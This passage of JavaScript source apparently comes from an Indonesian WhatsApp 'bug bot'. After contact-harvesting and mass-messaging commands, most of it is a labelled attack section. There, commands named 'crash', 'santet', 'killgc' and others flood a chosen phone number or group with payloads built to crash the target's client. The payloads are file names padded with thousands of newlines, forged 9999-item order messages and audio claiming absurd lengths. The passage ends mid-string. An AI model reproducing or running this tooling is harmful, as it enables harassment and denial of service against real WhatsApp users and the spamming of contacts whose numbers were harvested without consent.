await ZassTdr.sendMessage(from, { document: fs.readFileSync("./ZassTdrjs/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save Aja Ke Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./ZassTdrjs/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isCreator) return m.reply(`Jir Lu Siapa Cok`)
if (!isGroup) return m.reply(`Khusus Di Dalam Grup Jirr`)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
m.reply(`Waitt Proses Tod`)
const groupMetadata = m.isGroup? await ZassTdr.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./ZassTdrjs/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ZassTdr.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ZassTdr.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await ZassTdr.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
m.reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./ZassTdrjs/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await ZassTdr.sendMessage(sender, { document: fs.readFileSync("./ZassTdrjs/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save Ke Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./ZassTdrjs/database/contacts.json", JSON.stringify(contacts))
}
}
break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { text: "Bot Bug🔥`" }, { quoted: lep })
ZassTdr.sendMessage(prrkek, { text: "Bot Bug🔥`" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@fast4you", 
"sourceUrl": "https://youtube.com/@fast4you" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { document: thumb, caption: "NaufalHost 😈`", fileName: `Naufalhost 😈 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
ZassTdr.sendMessage(prrkek, { document: thumb, caption: "NaufalHost 😈`", fileName: `NaufalHost 😈 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@NaufalHost", 
"sourceUrl": "https://youtube.com/@Naufalhost" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "Bot Bug🔥", author: "" })
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "Bot Bug🔥", author: "" })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@NaufalHost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "NaufalHost 😈`",
"message": `${button}`,
"sellerJid": "6281228070013@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
ZassTdr.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await ZassTdr.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(mnm, { text: "Bot Bug🔥`" }, { quoted: lep })
ZassTdr.sendMessage(mnm, { text: "Bot Bug🔥`" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@NaufalHost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await ZassTdr.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(mnm, { document: thumb, caption: "NaufalHost 😈`", fileName: `Bot ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
ZassTdr.sendMessage(mnm, { document: thumb, caption: "NaufalHost 😈`", fileName: `Bot ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufalhost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await ZassTdr.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufalhost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
    case 'addgc': {
if (!isGroup) return m.reply(mess.OnlyGroup)         
if (!isCreator) return m.reply(mess.OnlyOwner)
pler.push(m.chat)
fs.writeFileSync('./ZassTdrjs/database/idgrup.json', JSON.stringify(pler))
m.reply('Sukses the group can create a domain')
}
        break
  case 'delgc': {
if (!isGroup) return m.reply(mess.OnlyGroup)         
if (!isCreator) return m.reply(mess.OnlyOwner)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./ZassTdrjs/database/idgrup.json', JSON.stringify(pler))
        m.reply('the group can no longer access the domain')
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await ZassTdr.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "NaufalHost 😈`",
"message": `${button}`,
"sellerJid": "6283148278021@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
ZassTdr.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
ZassTdr.sendMessage(from, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@NaufalHost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await ZassTdr.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@NaufalHost", 
"sourceUrl": "https://youtube.com/@NaufalHost" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { text: "Bot Bug🔥`" }, { quoted: lep })
ZassTdr.sendMessage(prrkek, { text: "Bot Bug🔥`" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { document: thumb, caption: "Bot Bug🔥`", fileName: `Bot Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\